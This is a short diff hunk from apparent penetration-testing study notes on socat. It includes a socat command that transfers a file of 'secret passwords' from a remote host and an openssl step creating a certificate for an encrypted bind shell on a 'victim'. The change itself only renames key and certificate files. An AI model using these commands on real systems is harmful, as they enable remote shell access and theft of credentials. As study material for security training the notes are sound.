@@ -201,7 +201,7 @@ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind.crt
 
 #converting to .pem
-cat bind_shell.key bind_shell.crt > bind_shell.pem
+cat bind.key bind.crt > bind.pem
 
 # victim
 
